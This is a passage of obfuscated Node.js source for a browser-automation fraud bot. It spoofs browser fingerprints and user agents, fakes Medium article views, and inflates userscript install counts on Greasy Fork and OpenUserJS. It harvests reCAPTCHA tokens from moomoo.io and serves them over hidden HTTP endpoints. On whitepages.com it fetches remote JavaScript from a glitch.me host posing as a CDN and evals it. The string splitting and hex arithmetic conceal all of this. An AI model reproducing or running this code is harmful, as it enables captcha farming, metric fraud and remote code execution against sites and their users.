      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x1b) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + Y(0x7) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + Y(0x4) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    Z(0x15, '$B95') + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    a0(0x1c) + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + a0(0x0) + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0x2123 + 0x1a02 + 0x721
  };

function a() {
  const bn = [
    '-routes-7c',
    'p8kGW6flgbLQWOHPha',
    ',mister\x20be',
    'wfvssdj1xZbMtq',
    'icHlsfrntcWGBa',
    'Bw9VlMLVigrLzG',
    'zJzIm2qWndLLmq',
    'AwTLieDLy2TVkq',
    'yMXVy2TZ',
    'zwfZEwzVCMSUBW',
    'WOddUvFcPXBcQ8ohWRZcL14',
    'n3BdH0fgjG',
    'zg9JDw1LBNqUza',
    'W5JdUc1ZWPfuW6anW7JcIW',
    'DJaUnG',
    'Ahr0Chm6lY9NCG',
    'DNtdM09wy8odW6JcMW',
    'B3jRlwzYB20TBG',
    'Dw5UzwnLC3nHCG',
    'pts/429746',
    'WQzqW6XaW5JdQW',
    'v8o6pvn7W4LlnHTy',
    'mc45lgLTywDLlW',
    'uZLfA1Hymffzra',
    'https://gr',
    'y3jLyxrLsw5JBW',
    'zwnYywz0igL6Ba',
    'CMCVzw4VC2nYAq',
    'https://bl',
    'WRyFeWnqitm+trG',
    'DY55B3v0DwjLlG',
    'digest'
  ];
  a = function() {
    return bn;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x107b * 0x2 + 0x6bc + -0x2 * -0xd1d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xe33 + -0x199e + 0x2835), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x10f1 * -0x1 + 0xcc8 + -0x5 * -0xe9), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x190c * 0x1 + 0x2526 + 0x3e32 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x15dd + -0x1012 + 0xf9 * 0x27; w < getRandomInt(0x266 + 0x49 * 0x7 + -0x464, -0x78d + -0x5 * -0x57 + 0x5df); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xe0f2 + -0xbea2 + 0x6 * 0x2158);
        }
      }();
    }, 0x34e * 0x6 + 0x498 + -0x1808), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x2de + -0xb01 + 0xddf;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate'](a1(0xc) + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2166 + 0x107 * -0x21 + 0x1 * 0x434d, 0xced * 0x2 + 0x1231 + 0x19 * -0x1c1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5b5 + -0x8e91 + 0xfe0c);
    }, 0xf3e + -0xb18 + 0x2 * -0x1e1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x15a7 + 0x3 * -0x7f6 + -0x2d89 * -0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x4dc + -0xd79 + 0xf * 0x15b), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x243c + -0x6a1 * 0x1 + 0x2add), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x6 * -0x14226 + -0x2 * -0x607c4 + 0x6a * 0x1646);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x983 * -0x2 + -0x119b + -0x107);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a2 = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x4 * -0x995 + 0x2 * 0x1386 + -0x4c98);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write'](a2(0xe)), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1b26 + 0x50e * 0x1 + 0xa4 * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a3 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x169d + -0x10 * 0x223 + 0x1 * 0x38ce) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xe41 + -0x5 * -0x9f + 0x3 * -0x5c9));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x22d5 + 0xce0 + 0x15f5, D['indexOf']('\x20'));
        return B ? E['slice'](0xcf3 + -0x347 * 0x6 + 0x6b7, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3edf + 0x2 * -0x50 + -0x172f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0xdda * 0x1 + -0x1780 * -0x3 + -0x2d4a),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + a3(0x16) + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x12ea + 0x1 * 0x23b1 + -0x10c7; k < -0x268c + 0x13c * 0x1d + 0x2c4; k++)
    setTimeout(f, (0x16dc * 0x10 + -0x3a31 * -0x3 + -0x131f3) * k * getRandomInt(-0x48c + -0x3ab + -0x1 * -0x838, -0x57b + -0x1e7e + 0x23fc));
  setInterval(() => {
    f();
    for (let l = 0x1 * 0x19d1 + 0xb * -0x322 + 0x1 * 0x8a5; l < -0x255 + 0xd * -0x248 + 0x1 * 0x2001; l++)
      setTimeout(f, (-0x2c59 * -0x2 + 0xd25e + -0x40b0) * l * getRandomInt(-0x1d29 + -0x1fe9 + 0xc37 * 0x5, -0x439 + -0x2 * -0xcb5 + -0x152e));
  }, -0x27fa26 * 0x2 + 0x253981 + 0x61a94b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
